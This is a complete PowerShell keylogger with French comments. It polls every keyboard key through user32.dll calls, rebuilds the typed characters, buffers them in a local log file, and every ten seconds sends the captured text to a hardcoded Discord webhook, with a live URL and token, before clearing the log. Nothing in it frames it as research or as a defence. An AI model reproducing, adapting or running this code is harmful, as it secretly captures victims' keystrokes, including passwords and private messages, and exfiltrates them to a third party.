# Force l’arrêt sur la moindre erreur
$ErrorActionPreference = 'Stop'

# Configuration
$webhookUrl    = 'https://discord.com/api/webhooks/1368558615723643010/dyqWaImPV6YXoC80G20tYmvQ4Rdx6g0T4uRQteC63CuP1LxN-lVBJjGNAZPQcxFbe0Y3'
$logFilePath   = "$PSScriptRoot\log.txt"
$idleThreshold = 1.5    # secondes d’inactivité pour flush
$sendInterval  = 10     # secondes entre envois

$wordBuffer   = ''
$lastKeyTime  = Get-Date
$lastSendTime = Get-Date

# Chargement de Windows.Forms pour [Keys]
Add-Type -AssemblyName System.Windows.Forms

# Déclaration P/Invoke unique pour tous les appels clavier
if (-not ('KeyboardHelper' -as [type])) {
Add-Type -Language CSharp -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class KeyboardHelper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int ToUnicode(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags
    );

    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
'@
}

# État du clavier
$keyState = [byte[]]::new(256)

function Get-CharFromKey {
    param($keyCode)

    [KeyboardHelper]::GetKeyboardState($keyState) | Out-Null
    $scan = [KeyboardHelper]::MapVirtualKey([uint32]$keyCode, 0)
    $sb   = New-Object System.Text.StringBuilder 5

    try {
        $count = [KeyboardHelper]::ToUnicode(
            [uint32]$keyCode,
            $scan,
            $keyState,
            $sb,
            $sb.Capacity,
            0
        )
        if ($count -gt 0) {
            return $sb.ToString()
        }
    } catch {
        # on ignore l’erreur native
    }
    return ''
}

function Send-LogFileToDiscord {
    if (-not (Test-Path $logFilePath)) { return }
    $allText = Get-Content $logFilePath -Raw
    $text    = $allText.Trim()
    if ($text.Length -eq 0) { return }

    # On vide le fichier immédiatement pour éviter les doublons en cas de multi-envoi
    Clear-Content -Path $logFilePath

    # Discord limite 2000 caractères. On envoie en tranches ≤1900.
    $maxLen = 1900
    for ($i = 0; $i -lt $text.Length; $i += $maxLen) {
        $chunk = $text.Substring($i, [Math]::Min($maxLen, $text.Length - $i))
        $md    = '```' + $chunk + '```'
        $payload = @{ content = $md } | ConvertTo-Json -Depth 1

        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
        } catch {
            Write-Host 'ERREUR ENVOI JSON :' $_.Exception.Message -ForegroundColor Red
        }
    }
}

try {
    while ($true) {
        $now           = Get-Date
        $anyKeyPressed = $false
        $currentChar   = $null

        # Scan de toutes les touches virtuelles (8–254)
        for ($vk = 8; $vk -le 254; $vk++) {
            if ([KeyboardHelper]::GetAsyncKeyState($vk) -band 0x8000) {
                $anyKeyPressed = $true
                $keyName       = [System.Windows.Forms.Keys]$vk

                if ($keyName -match '^[A-Z]$|^D[0-9]$|^Oem') {
                    $ch = Get-CharFromKey $vk
                    if ($ch -match '[\w\p{P}]') {
                        $currentChar = $ch
                    }
                }

                switch ($keyName) {
                    'Space'  { $currentChar = ' ' }
                    'Return' { $currentChar = [System.Environment]::NewLine }
                    'Back'   {
                        if ($wordBuffer.Length -gt 0) {
                            $wordBuffer = $wordBuffer.Substring(0, $wordBuffer.Length - 1)
                        }
                    }
                }
            }
        }

        # Gestion du buffer de frappes avec suppression des doublons adjacents
        if ($currentChar) {
            $idle = ($now - $lastKeyTime).TotalSeconds
            if ($idle -gt $idleThreshold -and $wordBuffer) {
                Add-Content -Path $logFilePath -Value $wordBuffer
                $wordBuffer = ''
            }
            if ($wordBuffer.Length -gt 0) {
                $lastChar = $wordBuffer[-1]
                if ($currentChar -ne $lastChar) {
                    $wordBuffer += $currentChar
                }
            } else {
                $wordBuffer += $currentChar
            }
            $lastKeyTime = $now
        }

        # Envoi périodique à Discord
        if (($now - $lastSendTime).TotalSeconds -gt $sendInterval) {
            if ($wordBuffer) {
                Add-Content -Path $logFilePath -Value $wordBuffer
                $wordBuffer = ''
            }
            Send-LogFileToDiscord
            $lastSendTime = $now
        }

        # Flush en cas d’inactivité prolongée
        if (-not $anyKeyPressed -and ($now - $lastKeyTime).TotalSeconds -gt $idleThreshold -and $wordBuffer) {
            Add-Content -Path $logFilePath -Value $wordBuffer
            $wordBuffer = ''
        }

        Start-Sleep -Milliseconds 10
    }
}
catch {
    Write-Host 'ERREUR FATALE :' $_.Exception.Message -ForegroundColor Red
    exit 1
}
